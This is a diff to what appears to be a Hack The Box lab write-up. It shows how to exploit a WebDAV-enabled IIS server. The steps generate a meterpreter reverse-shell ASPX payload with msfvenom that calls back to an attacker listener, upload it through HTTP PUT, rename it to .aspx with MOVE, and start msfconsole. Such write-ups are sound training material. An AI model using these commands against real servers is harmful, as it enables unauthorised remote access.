@@ -260,15 +260,47 @@ curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/r
 ---
 
 ## MSF Venom
-Generate the shell
+Using msfvenom and metasploit to get a reverse shell from the target machine.
+
+### Generate Shell
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c3c4c830-1a83-4773-9a6a-04f9665547a5)
 
 
+### Upload Shell 
 Upload the shell with `.txt` extension and then use the move http method to rename the shell with the `.aspx` extension.
 ```shell
 curl -X PUT http://10.10.10.15/shell.txt -d @shell.aspx
 curl -X MOVE -H 'Destination: http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
 ```
+
+## Metasploit
+Start
+```shell
+msfconsole
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v6.3.19-dev                          ]
++ -- --=[ 2318 exploits - 1215 auxiliary - 412 post       ]
++ -- --=[ 1234 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use the edit command to open the 
+currently active module in your editor
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6>
+```
+
